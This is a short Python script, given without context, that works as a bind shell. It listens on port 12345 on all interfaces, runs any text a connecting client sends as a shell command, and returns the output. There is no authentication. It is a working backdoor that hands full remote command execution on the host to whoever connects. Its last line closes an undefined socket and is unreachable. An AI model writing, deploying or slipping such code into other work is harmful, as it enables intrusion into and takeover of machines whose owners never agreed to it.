import socket
import subprocess
import sys

server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind(('0.0.0.0',12345))
server.listen(10)


client,addr=server.accept()
print('client %s is connection!' % (addr[0]))
while True:
    data=client.recv(1024)
    data = data.decode('utf-8')
    # print(data)
    res=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    res_stdout,res_stderr=res.communicate()

    # print(res_stdout.decode("GB2312"))
    # print(res_stderr.decode("GB2312"))


    client.send(res_stdout.decode(sys.getfilesystemencoding()).encode('utf-8'))
    client.send(res_stderr.decode(sys.getfilesystemencoding()).encode('utf-8'))
sock.close()
